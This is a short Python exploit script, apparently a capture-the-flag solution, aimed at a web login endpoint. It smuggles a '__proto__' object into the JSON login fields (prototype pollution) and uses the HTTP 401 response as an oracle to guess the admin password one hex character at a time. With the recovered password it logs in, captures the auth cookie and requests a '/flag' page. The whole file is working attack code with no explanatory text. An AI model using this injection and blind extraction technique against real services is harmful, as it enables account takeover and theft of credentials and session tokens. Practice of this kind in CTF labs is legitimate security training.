import requests

import requests
import threading
import time

class EXPLOIT:

    __chars = "0123456789abcdef"
    __password = ""
    __host = "http://192.168.18.50:53607"

    def __init__(self):
        self.__url = self.__host + "/login"

    def engage(self):
        if len(self.__password) != 32:
            for n in range(0, 32):
                for char in self.__chars:
                    r = requests.post(
                        self.__url,
                        json={
                            "id": "admin\",\"test\":{\"a\":\"b",
                            "password": "dummy\"},\"__proto__\":{\"password\":{\"value\":\"^COUNTER.*$\"}},\"id\":\"admin".replace(
                                "COUNTER", f"{self.__password}{char}"
                            )
                        }
                    )

                    if r.status_code == 401:
                        self.__password += char
                        print("Password: ", self.__password)

                        break
                    
        print("Logging in and getting token...")
        r = requests.post(
            self.__url,
            json={
                "id": "admin",
                "password": self.__password
            },
            headers={
                'Content-Type': 'application/json'
            }
        )
        token = r.cookies.get("auth")
        print(token)

        r = requests.post(
            self.__host + "/flag",
            headers={
                'Cookie': 'auth=' + token
            }
        )
        print(r.text)

if __name__ == "__main__":
    EXPLOIT().engage()
